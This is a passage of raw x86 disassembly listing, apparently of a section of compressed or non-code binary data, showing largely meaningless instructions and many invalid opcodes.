  4197fb:	and    al,0x81
  4197fd:	dec    edi
  4197fe:	ins    BYTE PTR es:[edi],dx
  4197ff:	or     edi,eax
  419801:	outs   dx,DWORD PTR ds:[esi]
  419802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419803:	rcr    eax,0xc2
  419806:	lods   eax,DWORD PTR ds:[esi]
  419807:	pop    esi
  419808:	jecxz  0x4197b4
  41980a:	sub    al,0x49
  41980c:	test   DWORD PTR [ebx-0x49],esp
  41980f:	mov    cl,0x60
  419811:	fld    TBYTE PTR [ebp+0x4b]
  419814:	mov    al,BYTE PTR ds:0x9f7880e3
  41981a:	and    BYTE PTR [edx+0x2770f790],0x86
  419821:	cmp    eax,ebp
  419823:	call   0x792:0x1e99176d
  41982a:	sbb    ah,bh
  41982c:	idiv   DWORD PTR [ebx+0x474b41f]
  419832:	dec    ecx
  419833:	test   BYTE PTR [edi],cl
  419835:	stc    
  419836:	(bad)  
  419837:	lds    ebx,FWORD PTR [edi]
  419839:	(bad)  
  41983a:	es jnp 0x419838
  41983d:	push   ss
  41983e:	jle    0x4197f7
  419840:	xchg   esp,eax
  419841:	mov    esp,0x488b2a55
  419846:	mov    edi,0xb3925540
  41984b:	mov    ecx,DWORD PTR [edi-0x41]
  41984e:	rol    DWORD PTR [edx],1
  419850:	add    al,0x7d
  419852:	jbe    0x41982c
  419854:	xor    al,0x33
  419856:	ror    DWORD PTR [edx-0x10c9c9d5],cl
  41985c:	and    DWORD PTR [ecx],edi
  41985e:	mov    ds,WORD PTR [ebx-0x42]
  419861:	pusha  
  419862:	(bad)  
  419863:	mov    ebx,0x52891581
  419868:	or     DWORD PTR [edx+eiz*2],edx
  41986b:	pushf  
  41986c:	mov    bl,0xaa
  41986e:	inc    eax
  41986f:	repnz enter 0x8e6,0x81
  419874:	or     dl,dl
  419876:	jg     0x4198e8
  419878:	sbb    DWORD PTR [ebp-0x7e],esp
  41987b:	mov    ds:0xf9145fe6,al
  419880:	mov    bh,0x67
  419882:	imul   DWORD PTR [ecx]
  419884:	std    
  419885:	xor    edi,DWORD PTR [esi+0x54]
  419888:	pop    ebx
  419889:	retf   
  41988a:	mov    dh,0x56
  41988c:	outs   dx,BYTE PTR ds:[esi]
  41988d:	out    dx,eax
  41988e:	inc    ebp
  41988f:	repz mov bh,0x60
  419892:	ret    0x27d2
  419895:	shl    DWORD PTR [ecx-0x21],1
  419898:	xchg   BYTE PTR [ecx-0x35],bl
  41989b:	dec    edi
  41989c:	and    WORD PTR [ecx],0xffb6
  4198a0:	adc    eax,0x93dcd8ab
  4198a5:	inc    ebx
  4198a6:	das    
  4198a7:	pusha  
  4198a8:	mov    esp,0x9cd4aa4c
  4198ad:	pop    ds
  4198ae:	je     0x419928
  4198b0:	sub    DWORD PTR [edx+0x67f88892],edi
  4198b6:	pop    edi
  4198b7:	sub    DWORD PTR [edi-0x54],0x7e
  4198bb:	retf   
  4198bc:	ret    0x532c
  4198bf:	push   ebx
  4198c0:	mov    dl,0xa2
  4198c2:	sbb    BYTE PTR [eax+esi*8+0x50e6ad30],bl
  4198c9:	mov    DWORD PTR fs:[ebx-0x6],esp
  4198cd:	nop
  4198ce:	sbb    bl,0x3
  4198d1:	xor    ah,cl
  4198d3:	cld    
  4198d4:	sar    BYTE PTR ds:0x4003c413,cl
  4198da:	call   DWORD PTR [esi+eiz*8]
  4198dd:	or     eax,0x15769e47
  4198e2:	call   0x92a1:0x30c3c10f
  4198e9:	push   edx
  4198ea:	jns    0x4198b1
  4198ec:	(bad)  
  4198ee:	lock outs dx,BYTE PTR ds:[esi]
  4198f0:	xchg   edx,eax
  4198f1:	dec    eax
  4198f2:	jp     0x4198e6
  4198f4:	mov    esi,0x459147ca
  4198f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198fa:	xor    DWORD PTR gs:[ebx+0x67e8dd05],esp
  419901:	jae    0x4198b1
  419903:	sub    BYTE PTR [edi-0x39ddfe93],0x3f
  41990a:	and    BYTE PTR [ebx+0x5c],ch
  41990d:	cs js  0x419933
  419910:	mov    ?,ebx
  419912:	std    
  419913:	mov    ds:0x181a7872,eax
  419918:	sub    ah,ch
  41991a:	xlat   BYTE PTR ds:[ebx]
  41991b:	hlt    
  41991c:	mov    cs,WORD PTR [ecx]
  41991e:	sub    eax,0x96d307b2
  419923:	xchg   DWORD PTR [eax+0x5],edx
  419926:	into   
  419927:	fisubr DWORD PTR [bx+si]
  41992a:	cmp    eax,0x86c7c8ab
  41992f:	jle    0x4198b3
  419931:	or     al,0xc2
  419933:	push   edx
  419934:	test   eax,0xcbaa4c5a
  419939:	sub    BYTE PTR [ecx],dl
  41993b:	inc    eax
  41993c:	push   0xfffffff6
  41993e:	pop    ebp
  41993f:	sub    eax,0x1562395d
  419944:	inc    ebp
  419945:	cmp    al,0x2
  419947:	xchg   ebp,eax
  419948:	sbb    al,0xc2
  41994a:	popf   
  41994b:	mov    dh,ah
  41994d:	fwait
  41994e:	sbb    DWORD PTR [edi],0xffffff90
  419951:	bound  esi,QWORD PTR ds:0xc31bd797
  419957:	or     ebp,DWORD PTR [eax+0x2bc2bcb6]
  41995d:	mov    esp,0xc1901417
  419962:	cmp    BYTE PTR [edx+0x4e],al
  419965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419966:	fwait
  419967:	or     eax,0x8e3f96ff
  41996c:	ret    0x9582
  41996f:	cmp    eax,0xada9b8bb
  419974:	sar    DWORD PTR [edi-0x511033c4],cl
  41997a:	hlt    
  41997b:	pop    ebx
  41997c:	pop    esi
  41997d:	xchg   esp,eax
  41997e:	dec    ecx
  41997f:	pop    es
  419980:	sbb    eax,0x4805790a
  419985:	add    al,0x7f
  419987:	pusha  
  419988:	pop    esp
  419989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41998a:	test   al,al
  41998c:	or     cl,BYTE PTR [ebx+0x4552512]
  419992:	stc    
  419993:	mov    esp,0xe525c4a1
  419998:	jecxz  0x41997c
  41999a:	loop   0x4199e7
  41999c:	fnstcw WORD PTR [bx+si+0x7]
  4199a0:	pusha  
  4199a1:	mov    WORD PTR [ebx+esi*2-0xee50706],es
  4199a8:	sbb    DWORD PTR [edx+0x5520a29c],ecx
  4199ae:	fild   DWORD PTR [edi+0x40dfd537]
  4199b4:	icebp  
  4199b5:	xor    DWORD PTR [esi],edx
  4199b7:	cs xchg ebp,eax
  4199b9:	push   ss
  4199ba:	or     eax,0xa087629f
  4199bf:	shr    BYTE PTR [esi+0x994b48],cl
  4199c5:	jno    0x419a08
  4199c7:	outs   dx,DWORD PTR ds:[esi]
  4199c8:	pop    edi
  4199c9:	pop    es
  4199ca:	aam    0xcf
  4199cc:	pop    ecx
  4199cd:	data16 or BYTE PTR [edi+ecx*2+0x13],bh
  4199d2:	add    BYTE PTR [esi],ah
  4199d4:	and    eax,0x2a7626d4
  4199d9:	shl    BYTE PTR [ebx-0x78a9658b],0x4a
  4199e0:	cmp    DWORD PTR [ecx+0x73],ebp
  4199e3:	lods   al,BYTE PTR ds:[esi]
  4199e4:	jno    0x419973
  4199e6:	and    edi,DWORD PTR [ecx]
  4199e8:	and    ah,BYTE PTR [ebx]
  4199ea:	jbe    0x4199bb
  4199ec:	retf   
  4199ed:	jo     0x4199e9
  4199ef:	pop    ds
  4199f0:	push   edx
  4199f1:	stos   BYTE PTR es:[edi],al
  4199f2:	iret   
  4199f3:	es add eax,0xc4a6fc54
  4199f9:	in     al,0xd9
  4199fb:	loop   0x4199e4
  4199fd:	ficomp WORD PTR ds:0x9db39a89
  419a03:	shr    DWORD PTR [eax+0x4b7fe354],0xe4
  419a0a:	jb     0x419a5a
  419a0c:	mov    eax,ds:0x9369497a
  419a11:	xor    esi,DWORD PTR [eax+edx*8]
  419a14:	push   es
  419a15:	retf   
  419a16:	imul   BYTE PTR [esi]
  419a18:	ins    BYTE PTR es:[edi],dx
  419a19:	or     bl,BYTE PTR [eax-0x7a]
  419a1c:	ins    BYTE PTR es:[edi],dx
  419a1d:	cmp    eax,DWORD PTR [ecx-0x66be1869]
  419a23:	test   BYTE PTR [ebp+0x7b8c9f1d],0xa6
  419a2a:	retf   
  419a2b:	and    al,BYTE PTR [esi+edi*4+0x64]
  419a2f:	adc    al,0xa1
  419a31:	push   0xffffffe9
  419a33:	and    dl,BYTE PTR [edi-0x1806579a]
  419a39:	cmp    esp,DWORD PTR [esp-0x18]
  419a3d:	pushf  
  419a3e:	ds repz jecxz 0x419abe
  419a42:	out    0xdf,al
  419a44:	sbb    dl,BYTE PTR [ebx-0x75]
  419a47:	or     ebx,DWORD PTR [ebx-0x5c177d87]
  419a4d:	out    0xca,eax
  419a4f:	mov    esp,0x32fa9193
  419a54:	popa   
  419a55:	dec    edi
  419a56:	mov    ebp,0x1dd8b63f
  419a5b:	mov    WORD PTR [ecx+eax*1-0x747ac205],gs
  419a62:	xchg   edx,eax
  419a63:	test   DWORD PTR [ebx],0x7f8a85d4
  419a69:	scas   eax,DWORD PTR es:[edi]
  419a6a:	xor    DWORD PTR [ebp+0x4043da6b],0x3a
  419a71:	mov    ecx,ss
  419a73:	jp     0x419aad
  419a75:	sub    BYTE PTR [edi+0x0],dh
  419a78:	xor    ebp,DWORD PTR [edi]
  419a7a:	sbb    ecx,edx
  419a7c:	repz (bad) 
  419a7e:	dec    edx
  419a7f:	cmc    
  419a80:	or     ebx,DWORD PTR [eax]
  419a82:	out    0x95,eax
  419a84:	loope  0x419ac8
  419a86:	and    al,0x62
  419a88:	mov    eax,0x311f56e3
  419a8d:	gs jmp eax
  419a90:	push   0x1381d1d5
  419a95:	pop    ds
  419a96:	std    
  419a97:	push   edi
  419a98:	sub    eax,0x9a676f53
  419a9d:	loop   0x419a7f
  419a9f:	add    dh,BYTE PTR [ebp-0x4bd75d18]
  419aa5:	(bad)  
  419aa6:	imul   BYTE PTR [ebx-0x5eca85d7]
  419aac:	mov    al,ds:0xd9636468
  419ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ab2:	call   0xc22d9e84
  419ab7:	dec    eax
  419ab8:	sbb    ah,BYTE PTR [eax-0x60e00d61]
  419abe:	mov    dh,0xd9
  419ac0:	(bad)  
  419ac1:	stos   DWORD PTR es:[edi],eax
  419ac2:	push   DWORD PTR [edx]
  419ac4:	sub    cl,BYTE PTR [eax]
  419ac6:	mov    bh,BYTE PTR [eax+eax*4-0x2e00d094]
  419acd:	inc    edi
  419ace:	mov    ebx,DWORD PTR [eax+0x6]
  419ad1:	mov    eax,0x7d2d6418
  419ad6:	inc    edi
  419ad7:	jmp    0x42cb8942
  419adc:	jae    0x419ab4
  419ade:	shl    BYTE PTR [ebx+0x60],cl
  419ae1:	sbb    DWORD PTR [esi-0x4257ecfe],0xffffff9b
  419ae8:	add    DWORD PTR [ebx+0x6882974],esp
  419aee:	popa   
  419aef:	pop    esi
  419af0:	inc    eax
  419af1:	imul   ebp,eax,0xffffffd4
  419af4:	sub    ah,BYTE PTR [ebp-0x51]
  419af7:	mov    esp,DWORD PTR [eax+0x2a315a84]
  419afd:	mov    fs,WORD PTR [esi-0x61]
  419b00:	in     al,dx
  419b01:	ins    DWORD PTR es:[edi],dx
  419b02:	pop    ebp
  419b03:	jecxz  0x419b51
  419b05:	sbb    BYTE PTR [ebx+0x3da60c35],0x78
  419b0c:	and    al,0xf6
  419b0e:	dec    edx
  419b0f:	sub    DWORD PTR [edx+0x75],ecx
  419b12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b13:	jae    0x419b65
  419b15:	inc    edx
  419b16:	cmp    edx,ecx
  419b18:	push   ds
  419b19:	scas   al,BYTE PTR es:[edi]
  419b1a:	cmc    
  419b1b:	addr16 jne 0x419b43
  419b1e:	stos   BYTE PTR es:[edi],al
  419b1f:	dec    esp
  419b20:	cli    
  419b21:	add    ch,BYTE PTR [eax-0x777c4cab]
  419b27:	or     BYTE PTR [ecx],ah
  419b29:	test   DWORD PTR [eax-0x432eb9c7],edx
  419b2f:	push   0xffffff82
  419b31:	ja     0x419b3f
  419b33:	(bad)  
  419b34:	ds clc 
  419b36:	lahf   
  419b37:	icebp  
  419b38:	push   0x66
  419b3a:	jmp    0x11e:0x9d6e68f4
  419b41:	jge    0x419ae7
  419b43:	(bad)  
  419b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b45:	xchg   esi,eax
  419b46:	imul   eax,DWORD PTR [ecx+esi*2-0x6dd8584],0x80d07e5b
  419b51:	add    al,BYTE PTR [ecx-0x33b5c892]
  419b57:	es pop esp
  419b59:	aad    0x25
  419b5b:	dec    ecx
  419b5c:	pushf  
  419b5d:	je     0x419b4b
  419b5f:	push   esp
  419b60:	sub    DWORD PTR [edx],ebx
  419b62:	sub    eax,edi
  419b64:	mov    edi,0x66cc20ee
  419b69:	fmulp  st(6),st
  419b6b:	mov    dh,0x9f
  419b6d:	add    bh,BYTE PTR [ecx]
  419b6f:	fbstp  TBYTE PTR [ebx+0x3a]
  419b72:	(bad)  
  419b73:	imul   eax,DWORD PTR [eax-0x73156440],0xffffffc6
  419b7a:	daa    
  419b7b:	dec    ecx
  419b7c:	int3   
  419b7d:	jmp    0xb9b479b1
  419b82:	test   BYTE PTR [ecx+0x67],ah
  419b85:	xlat   BYTE PTR ds:[ebx]
  419b86:	and    eax,ebp
  419b88:	lahf   
  419b89:	daa    
  419b8a:	xor    bh,BYTE PTR [esp+ecx*1]
  419b8d:	adc    edx,DWORD PTR [esi-0x6e]
  419b90:	das    
  419b91:	mov    eax,0xa50cf81d
  419b96:	xchg   ebx,eax
  419b97:	out    0x1,eax
  419b99:	pop    ss
  419b9a:	xchg   BYTE PTR [esi],ch
  419b9c:	add    BYTE PTR [ebp+0x4114e1b7],bl
  419ba2:	in     eax,0x94
  419ba4:	cmp    BYTE PTR [esi],bh
  419ba6:	add    al,0xba
  419ba8:	cdq    
  419ba9:	repz sub DWORD PTR [eax],eax
  419bac:	or     eax,DWORD PTR [eax+0x5baeb1dd]
  419bb2:	push   edx
  419bb3:	inc    edi
  419bb4:	add    BYTE PTR [edx-0x58f9d96e],0x7d
  419bbb:	sbb    eax,DWORD PTR [esi+0x5a]
  419bbe:	ja     0x419b58
  419bc0:	cmp    DWORD PTR [ebp-0x4edfe237],esi
  419bc6:	mov    al,0xb1
  419bc8:	and    BYTE PTR [esi],0x3e
  419bcb:	mov    BYTE PTR [esi+0x49ba861a],bl
  419bd1:	std    
  419bd2:	sub    dh,bh
  419bd4:	retf   0xea3d
  419bd7:	gs mov bh,0x4
  419bda:	pop    edx
  419bdb:	inc    eax
  419bdc:	dec    esi
  419bdd:	aad    0x56
  419bdf:	or     cl,BYTE PTR [ecx+0x7c1a5f0a]
  419be5:	jae    0x419c41
  419be7:	adc    edx,esi
  419be9:	adc    BYTE PTR [ebx-0x4eed15b1],0x81
  419bf0:	xchg   ebp,eax
  419bf2:	push   ss
  419bf3:	mov    ds:0x25114149,al
  419bf8:	dec    ebx
  419bf9:	(bad)  
  419bfa:	repnz enter 0xb4cc,0x67
  419bff:	mov    eax,ds:0x1ba52b70
  419c04:	xchg   ecx,eax
  419c05:	js     0x419b99
  419c07:	lahf   
  419c08:	retf   
  419c09:	xlat   BYTE PTR ds:[ebx]
  419c0a:	sub    al,0x43
  419c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c0d:	fmul   QWORD PTR [esi+0x39]
  419c10:	jne    0x419bbc
  419c12:	push   ebx
  419c13:	int3   
  419c14:	fldcw  WORD PTR ds:0xe8b765d9
  419c1a:	mov    eax,0x65151f5a
  419c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c20:	outs   dx,DWORD PTR ds:[esi]
  419c21:	pop    eax
  419c22:	test   eax,0xdfd1af07
  419c27:	xor    ebp,DWORD PTR [ecx]
  419c29:	enter  0x161,0x66
  419c2d:	icebp  
  419c2e:	cs xchg esp,eax
  419c30:	imul   ecx,DWORD PTR [edx],0xa6618fc3
  419c36:	js     0x419c5c
  419c38:	lahf   
  419c39:	jp     0x419c3e
  419c3b:	xchg   BYTE PTR [ebp+ecx*1-0x5a],dl
  419c3f:	in     eax,0x78
  419c41:	fdivr  QWORD PTR [ecx]
  419c43:	pusha  
  419c44:	daa    
  419c45:	(bad)  
  419c46:	leave  
  419c47:	in     al,dx
  419c48:	loopne 0x419c20
  419c4a:	add    al,0xa8
  419c4c:	jp     0x419c3d
  419c4e:	pop    ebx
  419c4f:	out    dx,al
  419c50:	jecxz  0x419c74
  419c52:	scas   eax,DWORD PTR es:[edi]
  419c53:	cdq    
  419c54:	dec    ebp
  419c55:	inc    ecx
  419c56:	pop    esp
  419c57:	repnz lahf 
  419c59:	mov    edx,0x3deab5b0
  419c5e:	jo     0x419c98
  419c60:	in     eax,dx
  419c61:	jb     0x419cc2
  419c63:	cdq    
  419c64:	lock mov ebx,0xc56e3fbc
  419c6a:	fisub  WORD PTR [edi]
  419c6c:	jecxz  0x419c5e
  419c6e:	push   edi
  419c6f:	ret    0x38a
  419c72:	jl     0x419c4c
  419c74:	jmp    0x419c18
  419c76:	or     eax,0x6b842635
  419c7b:	fs aaa 
  419c7d:	in     eax,dx
  419c7e:	enter  0xe7de,0xd
  419c82:	or     ebp,DWORD PTR [edi+0x7e]
  419c85:	inc    esi
  419c86:	pop    edi
  419c87:	(bad)  
  419c88:	fld    QWORD PTR [edi+0x6b]
  419c8b:	inc    edi
  419c8c:	rcl    DWORD PTR [ebx+0x4b],cl
  419c8f:	in     eax,dx
  419c90:	popf   
  419c91:	pop    ss
  419c92:	mov    bh,0x68
  419c94:	enter  0x1c00,0xac
  419c98:	les    ecx,FWORD PTR [edx+ebx*8-0x48]
  419c9c:	sub    edx,eax
  419c9e:	and    eax,0x18da186f
  419ca3:	ret    
  419ca4:	add    dh,BYTE PTR [ecx]
  419ca6:	mov    BYTE PTR [esi-0x29],al
  419ca9:	js     0x419c5a
  419cab:	mov    eax,0xf144a81f
  419cb0:	dec    eax
  419cb1:	sbb    eax,0x867b2c97
  419cb6:	xor    ch,BYTE PTR [edx+0x17]
  419cb9:	je     0x419c6f
  419cbb:	cmp    ebx,DWORD PTR cs:[ecx-0x660f877e]
  419cc2:	xor    al,0xa9
  419cc4:	pop    ss
  419cc5:	pusha  
  419cc6:	sub    bh,al
  419cc8:	mov    DWORD PTR [eax+edx*4-0x1e],esi
  419ccc:	push   cs
  419ccd:	stc    
  419cce:	inc    eax
  419ccf:	and    DWORD PTR [eax-0x44],0x3a
  419cd3:	dec    edx
  419cd4:	push   edx
  419cd5:	jbe    0x419cf2
  419cd7:	stos   BYTE PTR es:[edi],al
  419cd8:	mul    DWORD PTR [ecx]
  419cda:	cwde   
  419cdb:	daa    
  419cdc:	idiv   BYTE PTR [ebx-0x5d]
  419cdf:	xor    ch,cl
  419ce1:	push   edx
  419ce2:	loop   0x419c9f
  419ce4:	xchg   edx,eax
  419ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ce6:	jmp    0xbf96:0xcd2e55be
  419ced:	data16 std 
  419cef:	mov    bh,0x10
  419cf1:	outs   dx,DWORD PTR ds:[esi]
  419cf2:	das    
  419cf3:	std    
  419cf4:	pushf  
  419cf5:	daa    
  419cf6:	loopne 0x419d38
  419cf8:	adc    eax,0xcf27800d
  419cfd:	in     eax,0x66
  419cff:	les    ebp,FWORD PTR [ebp+0x324e339b]
  419d05:	adc    al,ch
  419d07:	fild   WORD PTR [edx-0x20e5ae7]
  419d0d:	enter  0x15c8,0xea
  419d11:	into   
  419d12:	mov    cl,0x84
  419d14:	sub    eax,0x5fb66eff
  419d19:	das    
  419d1a:	lods   al,BYTE PTR ds:[esi]
  419d1b:	not    esi
  419d1d:	pop    ss
  419d1e:	(bad)  
  419d20:	call   0x556a506c
  419d25:	int    0xdf
  419d27:	fistp  WORD PTR [edi+0x7514d48a]
  419d2d:	call   0x3d43c602
  419d32:	int3   
  419d33:	xchg   ebp,eax
  419d34:	ds in  eax,dx
  419d36:	div    BYTE PTR [eax+ebp*8+0x48]
  419d3a:	and    al,0x68
  419d3c:	jbe    0x419cfb
  419d3e:	jbe    0x419d0b
  419d40:	jmp    DWORD PTR [ebx-0x7c]
  419d43:	aam    0xf8
  419d45:	lds    ebp,FWORD PTR [ecx]
  419d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d48:	and    al,0x8b
  419d4a:	rcr    DWORD PTR [ecx],cl
  419d4c:	and    edi,DWORD PTR [edx+esi*1+0x59]
  419d50:	punpckhdq mm6,mm2
  419d53:	mov    BYTE PTR [ecx-0x51342dff],dl
  419d59:	mov    ah,0x8
  419d5b:	(bad)  
  419d5c:	dec    eax
  419d5d:	aas    
  419d5e:	jb     0x419d1d
  419d60:	xor    al,bh
  419d62:	mov    bh,0xd5
  419d64:	scas   eax,DWORD PTR es:[edi]
  419d65:	adc    esi,DWORD PTR [ebp+0x22bff5a7]
  419d6b:	sub    al,0x5f
  419d6d:	ret    
  419d6e:	mov    ch,0xd4
  419d70:	cwde   
  419d71:	dec    ecx
  419d72:	push   eax
  419d73:	push   esp
  419d74:	es jl  0x419d7d
  419d77:	add    DWORD PTR [esi+ebx*8+0x638303ab],0x9ad41481
  419d82:	call   0x2141:0xb5dd0bb1
  419d89:	into   
  419d8a:	adc    eax,0xd6ff4084
  419d8f:	and    eax,0x176cec3c
  419d94:	mov    al,ds:0x32ffd6a8
  419d99:	mov    eax,ds:0x7c5e1cc8
  419d9e:	push   esp
  419d9f:	dec    edx
  419da0:	sahf   
  419da1:	sbb    cl,BYTE PTR [edx+0x5d702848]
  419da7:	call   0xaee7fbbd
  419dac:	fcom   st(4)
  419dae:	fadd   DWORD PTR [eax]
  419db0:	mov    al,0xce
  419db2:	mov    ds:0x20aa012b,eax
  419db7:	mov    ebx,0x536adb36
  419dbc:	outs   dx,DWORD PTR ds:[esi]
  419dbd:	imul   eax,DWORD PTR [ebx+0x33],0x10
  419dc1:	sub    al,0x39
  419dc3:	pop    es
  419dc4:	or     bh,BYTE PTR [esi-0x534a242d]
  419dca:	push   ebp
  419dcb:	sti    
  419dcc:	or     eax,0x71893247
  419dd1:	xor    bl,al
  419dd3:	add    esi,DWORD PTR [edi-0x78e4462b]
  419dd9:	dec    ebp
  419dda:	jge    0x419dd7
  419ddc:	sub    eax,DWORD PTR [ecx+0x79c5986e]
  419de2:	mov    WORD PTR [esi+0x3bf983eb],?
  419de8:	xchg   ecx,eax
  419de9:	pushf  
  419dea:	inc    esi
  419deb:	mov    ecx,0xc6dd5f28
  419df0:	jne    0x419e62
  419df2:	out    dx,eax
  419df3:	lods   al,BYTE PTR ds:[esi]
  419df4:	out    dx,al
  419df5:	ret    
  419df6:	aas    
  419df7:	in     eax,dx
  419df8:	(bad)  
  419df9:	lods   eax,DWORD PTR ds:[esi]
  419dfa:	pushf  
  419dfb:	mov    ds:0x3286574d,eax
  419e00:	push   ds
  419e01:	sbb    bh,BYTE PTR ds:0xa06acee5
  419e07:	aam    0xd
  419e09:	cmp    edi,DWORD PTR [ecx+0x19ca884a]
  419e0f:	daa    
  419e10:	pop    edx
  419e11:	(bad)  [edi]
  419e13:	mov    al,ds:0xfef4bdc9
  419e18:	stos   DWORD PTR es:[edi],eax
  419e19:	mov    ebp,0x6c0f3ec3
  419e1e:	dec    esp
  419e1f:	xchg   esi,eax
  419e20:	mov    WORD PTR [edx],es
  419e22:	dec    ebx
  419e23:	cmp    bl,BYTE PTR [eax]
  419e25:	cdq    
  419e26:	sti    
  419e27:	fdivp  st(0),st
  419e29:	xor    eax,0x35016211
  419e2e:	mov    edx,ebx
  419e30:	aam    0x99
  419e32:	dec    edx
  419e33:	dec    ecx
  419e34:	out    dx,al
  419e35:	xor    ebx,DWORD PTR cs:[edi+eiz*8]
  419e39:	(bad)  
  419e3a:	mov    al,ds:0x9ed6971a
  419e3f:	inc    edi
  419e40:	inc    BYTE PTR [edi+edx*1-0x74]
  419e44:	xor    al,0x1b
  419e46:	gs pusha 
  419e48:	icebp  
  419e49:	and    bh,BYTE PTR [edx]
  419e4b:	lods   eax,DWORD PTR ds:[esi]
  419e4c:	in     al,0xa7
  419e4e:	les    ecx,FWORD PTR [edx-0x6e]
  419e51:	bound  esp,QWORD PTR [eax+0x4515066d]
  419e57:	pushf  
  419e58:	xor    eax,0xb0438385
  419e5d:	jecxz  0x419ed2
  419e5f:	inc    eax
  419e60:	imul   edx,DWORD PTR [ebx+0x3f45b332],0x62ec54ac
  419e6a:	jae    0x419ecc
  419e6c:	mov    ebp,0x68ba89bd
  419e71:	ror    DWORD PTR cs:[edx+esi*8+0x30780917],cl
  419e79:	push   ecx
  419e7a:	fs mov esp,0x9ca470a8
  419e80:	push   eax
  419e81:	add    esp,DWORD PTR [edi-0x77]
  419e84:	scas   al,BYTE PTR es:[edi]
  419e85:	xchg   ebx,eax
  419e86:	sar    DWORD PTR [eax-0x48],0x15
  419e8a:	cwde   
  419e8b:	mov    ebx,ebx
  419e8d:	je     0x419e45
  419e8f:	ficomp WORD PTR [edx-0x42]
  419e92:	sbb    ch,BYTE PTR [eax+0x55d665be]
  419e98:	adc    eax,0xfc2a0fba
  419e9d:	cmp    al,0x8d
  419e9f:	add    ecx,eax
  419ea1:	in     al,dx
  419ea2:	(bad)  
  419ea3:	ss shl dh,0xa2
  419ea7:	out    dx,eax
  419ea8:	push   cs
  419ea9:	imul   ecx,DWORD PTR [edi-0x620574ff],0x70
  419eb0:	add    eax,0x14b2eeae
  419eb5:	sbb    eax,0xfe66a447
  419eba:	retf   0xc787
  419ebd:	dec    edi
  419ebe:	cmp    al,0xd3
  419ec0:	cmp    esp,0x2f3fe224
  419ec6:	or     al,0xf5
  419ec8:	pop    ebx
  419ec9:	retf   
  419eca:	out    dx,al
  419ecb:	enter  0x3780,0x17
  419ecf:	sub    ah,al
  419ed1:	cmp    eax,0xce9fd0aa
  419ed6:	outs   dx,BYTE PTR ds:[esi]
  419ed7:	xor    edx,esi
  419ed9:	or     eax,0x63400cf4
  419ede:	mov    esp,0x2653ad
  419ee3:	jge    0x419f57
  419ee5:	push   edi
  419ee6:	jne    0x419eb5
  419ee8:	fwait
  419ee9:	shl    esp,0x65
  419eec:	jo     0x419ef9
  419eee:	push   eax
  419ef0:	and    cl,BYTE PTR [ebp-0x66]
  419ef3:	or     BYTE PTR ds:0xfbbd05ea,dh
  419ef9:	pop    ss
  419efa:	mov    dl,0x56
  419efc:	iret   
  419efd:	add    BYTE PTR [ecx],bl
  419eff:	adc    ecx,ebx
  419f01:	std    
  419f02:	enter  0x8e98,0x5a
  419f06:	lods   al,BYTE PTR ds:[esi]
  419f07:	jnp    0x419e91
  419f09:	das    
  419f0a:	hlt    
  419f0b:	jmp    0x419e97
  419f0d:	jns    0x419f08
  419f0f:	aam    0x90
  419f11:	mov    ah,0x73
  419f13:	test   eax,0xcb5d525d
  419f18:	imul   ebp,DWORD PTR [edi],0x59
  419f1b:	lahf   
  419f1c:	mov    al,ds:0x5621745c
  419f21:	inc    eax
  419f22:	mov    edi,0x3a44b076
  419f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f28:	stos   DWORD PTR es:[edi],eax
  419f29:	and    DWORD PTR [edx+0x3f650aca],ecx
  419f2f:	mov    edi,0xc6c19386
  419f34:	jg     0x419eb8
  419f36:	popa   
  419f37:	and    BYTE PTR [esi+0x67bd67ca],bh
  419f3d:	sbb    DWORD PTR [eax+0xc],0x6e
  419f41:	pop    ds
  419f42:	xor    DWORD PTR [ecx+0x11c973a5],esi
  419f48:	inc    ebp
  419f49:	ins    DWORD PTR es:[edi],dx
  419f4a:	or     al,0x80
  419f4c:	inc    esp
  419f4d:	mov    ds:0x38c0f2ca,eax
  419f52:	shr    ch,1
  419f54:	add    BYTE PTR [ebx-0x2a],bl
  419f57:	xor    BYTE PTR [esi+ebx*8-0x11d5dc3],0xdb
  419f5f:	bound  edx,QWORD PTR [ebx+0x74]
  419f62:	dec    ebx
  419f63:	cmp    al,0x97
  419f65:	cmp    BYTE PTR [eax+0x6],dh
  419f68:	shl    DWORD PTR [ebx+esi*8],cl
  419f6b:	fist   WORD PTR [esi+eiz*8-0x69097caa]
  419f72:	in     eax,dx
  419f73:	sahf   
  419f74:	cmp    esi,DWORD PTR [edx]
  419f76:	out    dx,al
  419f77:	loopne 0x419fb4
  419f79:	in     al,dx
  419f7a:	lods   eax,DWORD PTR es:[esi]
  419f7c:	jmp    0x2c6b:0x857c78b2
  419f83:	cmp    BYTE PTR [edx],dl
  419f85:	jae    0x419f0b
  419f87:	sub    BYTE PTR ds:0x162711ec,0x1d
  419f8e:	in     al,dx
  419f8f:	push   cs
  419f90:	fist   DWORD PTR [edx]
  419f92:	jmp    0xc2d36e7b
  419f97:	xchg   esi,eax
  419f98:	pusha  
  419f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9a:	imul   ecx,esp,0xa1cb7d2
  419fa0:	dec    esi
  419fa1:	mov    ds,WORD PTR [ebx+0x77]
  419fa4:	popf   
  419fa5:	mov    ah,0x29
  419fa7:	aad    0xb0
  419fa9:	into   
  419faa:	icebp  
  419fab:	dec    ebp
  419fac:	ret    
  419fad:	inc    edi
  419fae:	adc    DWORD PTR [edi],eax
  419fb0:	bound  esi,QWORD PTR [ecx+0x4d]
  419fb3:	xchg   edx,eax
  419fb4:	add    al,BYTE PTR [edx-0x68]
  419fb7:	scas   eax,DWORD PTR es:[edi]
  419fb8:	outs   dx,BYTE PTR ds:[esi]
  419fb9:	arpl   WORD PTR [edx+0x6a],cx
  419fbc:	adc    BYTE PTR [eax+ebx*2],0x45
  419fc0:	jle    0x419fb5
